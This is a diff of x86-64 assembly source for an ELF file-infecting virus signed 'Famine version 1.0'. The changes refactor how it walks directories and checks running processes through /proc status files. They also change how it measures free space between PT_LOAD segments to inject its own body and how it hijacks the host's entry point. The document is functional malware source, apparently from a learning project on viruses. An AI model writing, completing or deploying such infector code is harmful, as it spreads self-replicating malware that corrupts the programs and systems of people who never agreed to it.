@@ -2,8 +2,7 @@ section.text:
 	global _start:function
 
 ;-------------------------------------------------------------------------------
-;|   r8   | virus entry                                                        |
-;|   r9   | virus end
+;|   r8   | virus entry in memory                                              |
 ;-------------------------------------------------------------------------------
 
 ;-> Save bytes:
@@ -56,19 +55,16 @@ ret
 %endif; ========================================================================
 
 _inject:
+	; check for process running
 	lea rdi, [rel process_dir]
 	push 1
 	pop rsi ; mode for move_through_dir
 	call _move_through_dir
+	pop rdi; pop addr from stack
 	cmp rax, 0x0
 	jne _end
 
-	pop rdi; pop addr from stack
-
 	; save register
-	push r8
-	push r9
-	push rdx
 
 	%ifdef DEBUG
 		call _print; _print(rdi)
@@ -76,11 +72,7 @@ _inject:
 	sub rdi, 0x5; sub call instr
 	push rdi; mov r8, rsi
 	pop r8
-; r8 contains the entry of the virus
-	jmp _check_end
-	_back_host:
-		pop r9
-	; r9 contains the end of the virus (minus params)
+	; r8 contains the entry of the virus
 
 	xor rsi, rsi ; mode for move_through_dir
 	lea rdi, [rel directories]
@@ -182,16 +174,12 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 
 			push rdi
 			pop rbx
-			mov rsi, r10
 			mov rdi, rsp; buffer
+			mov rsi, r10
 			call _ft_strcpy
-			call _ft_strlen
-			add rdi, rax
-			mov byte[rdi], '/'
-			add rdi, 1
-			mov rsi, rbx
-			call _ft_strcpy
-			mov rdi, rsp
+			push rbx
+			pop rsi
+			call _ft_concat_path
 
 		; check infect_dir or infect_file
 			push r11 ; stat using r11
@@ -211,42 +199,24 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 			je .infect
 
 			; process
-			and rax, 0o0170000 ; S_IFMT
 			cmp rax, 0o0040000 ; S_IFDIR
-			je .process_dir
-			cmp rax, 0o0100000 ; S_IFREG
 			jne .free_buffers
 
+			; if /proc/[nb] -> check /proc/[nb]/status
 			push rdi
-			push rsi
-			mov rdi, rbx
-			lea rsi, [rel process_status]
-			call _ft_strcmp
-			pop rsi
+			push rbx
 			pop rdi
-
+			call _ft_isnum
+			pop rdi
 			cmp rax, 0x0
-			jne .free_buffers
+			je .free_buffers
+			lea rsi, [rel process_status]
+			call _ft_concat_path
 			call _check_file_process
-
 			cmp rax, 0x0
 			jne .process_found
+
 			jmp .free_buffers
-
-			.process_dir:
-				push rdi
-				push rbx
-				pop rdi
-				call _ft_isnum
-				pop rdi
-				cmp rax, 0x0
-				je .free_buffers
-				mov rsi, r13
-				call _move_through_dir
-				cmp rax, 0x0
-				jne .process_found
-				jmp .free_buffers
-
 			.infect:
 				cmp rax, 0o0040000 ; S_IFDIR
 				je .infect_dir
@@ -255,7 +225,7 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 				jmp .free_buffers
 
 		.infect_dir:
-			mov rsi, r13
+			xor rsi, rsi; infect -> 0
 			call _move_through_dir
 			jmp .free_buffers
 
@@ -284,6 +254,7 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 		add rsp, 4096
 		pop rbx
 		pop rcx
+
 	.close:
 		push rax
 		pop rsi
@@ -337,7 +308,6 @@ _infect_file: ; (string rdi, stat rsi)
 	push rax
 	pop r8
 
-	push r9
 	push r10
 	xor rdi, rdi
 	mov rsi, [r12 + 48] ; statbuf.st_size
@@ -350,7 +320,6 @@ _infect_file: ; (string rdi, stat rsi)
 	pop rax ; mmap
 	syscall
 	pop r10
-	pop r9
 	push r8
 	pop r11; fd
 	pop r8
@@ -418,9 +387,9 @@ _infect_file: ; (string rdi, stat rsi)
 			add rdi, rsi; p_offset + p_filesz
 			mov rsi, [rbx + 56 + 8] ; next->p_offset
 			sub rsi, rdi
-			mov rdx, r9
-			sub rdx, r8
-			add rdx, 8 * 3 ; params (uint64_t * nb)
+			lea rdx, [rel _eof]
+			lea r9, [rel _start]
+			sub rdx, r9
 			cmp rsi, rdx
 			jl .unmap ; if size between PT_LOAD isn't enough -> abort
 			; TODO: maybe infect via PT_NOTE ?
@@ -496,7 +465,6 @@ ret
 
 _check_file_process:; (string rdi)
 	push r8
-	push r9
 	push rcx
 	push rdx
 	push rsi
@@ -577,7 +545,6 @@ _check_file_process:; (string rdi)
 	pop rsi
 	pop rdx
 	pop rcx
-	pop r9
 	pop r8
 ret
 
@@ -591,22 +558,29 @@ _infected:
 	add rax, [rel entry_prg]
 	sub rax, [rel vaddr]
 
-	pop rdx
-	pop r9
-	pop r8
-
 	jmp rax
 
 _exit:
-	pop rdx
-	pop r9
-	pop r8
-
 	mov rax, 60 ; exit
 	xor rdi, rdi; = 0
 	syscall
 
 ; ================================ utils =======================================
+
+_ft_concat_path: ;(string rdi, string rsi) -> rdi is dest, must be in stack or mmaped region
+	push rdx
+
+	mov rdx, rdi
+	call _ft_strlen
+	add rdi, rax
+	mov byte[rdi], '/'
+	inc rdi
+	call _ft_strcpy
+	mov rdi, rdx
+	mov rax, rdi
+
+	pop rdx
+ret
 
 _ft_isnum:; (string rdi) ; 1 yes 0 no
 	push rcx
@@ -786,10 +760,9 @@ elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 %endif
 signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
-_check_end:
-	call _back_host; push addr to stack
-
 _params:
 	vaddr dq 0x0
 	entry_inject dq 0x0
 	entry_prg dq 0x0
+
+_eof:
